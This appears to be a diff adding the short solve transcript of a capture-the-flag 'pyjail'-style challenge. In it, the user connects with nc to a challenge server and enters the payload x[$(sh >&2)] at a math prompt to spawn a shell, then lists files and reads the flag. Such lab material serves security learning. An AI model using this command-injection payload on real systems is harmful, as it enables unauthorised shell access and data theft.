@@ -1,0 +1,8 @@
+$ nc challs1.pyjail.club 5838
+Enter math > x[$(sh >&2)]
+ls
+blind.sh
+flag.txt
+run
+cat flag.txt
+jail{blind-calc_9c701e8c09f6cc0edd6}
